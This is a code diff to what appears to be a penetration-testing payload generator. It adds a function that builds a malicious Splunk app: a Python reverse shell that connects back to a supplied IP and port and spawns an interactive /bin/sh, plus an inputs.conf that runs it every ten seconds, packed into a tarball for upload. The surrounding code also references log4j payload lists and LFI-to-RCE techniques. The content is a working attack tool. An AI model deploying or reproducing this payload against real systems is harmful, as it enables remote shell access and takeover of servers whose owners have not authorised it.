@@ -152,6 +152,40 @@ def log4j_list(ip):
 	for i in list_log4j:
 		print(i.replace("{IP}",ip))
 
+
+# reverse_shell_splunk
+# ├── bin
+# │   └── rev.py
+# └── default
+#     └── inputs.conf
+def splunk_rce(ip,port):
+	# rev.py
+	rev_payload = """
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("{IP}",{PORT}));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+	""".replace("{IP}",ip).replace("{PORT}",port)
+
+	# inputs.conf
+	inputs_conf = """[script://./bin/rev.py]
+disabled = 0
+interval = 10
+sourcetype = pentest
+	"""
+	os.system("mkdir -p reverse_shell_splunk/bin")
+	os.system("mkdir -p reverse_shell_splunk/default")
+	with open("reverse_shell_splunk/bin/rev.py","w") as f:
+		f.write(rev_payload.strip())
+	with open("reverse_shell_splunk/default/inputs.conf","w") as f:
+		f.write(inputs_conf.strip())
+	os.system("tar -czf /tmp/reverse_shell_splunk.tgz reverse_shell_splunk 2>/dev/null")
+	os.system("rm -rf reverse_shell_splunk")
+	print("Please upload file /tmp/reverse_shell_splunk.tgz and install it")
+
 # https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 # https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py
 # https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
@@ -350,6 +384,8 @@ def main():
 			print(j.replace("{NODE_BASE64}",temp.decode("ascii")).strip())
 		elif "{LOG4J}" in j:
 			log4j_list(ip)
+		elif "{SPLUNK_RCE}" in j:
+			splunk_rce(ip,port)
 		else:
 			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
 	if not onlypayload:
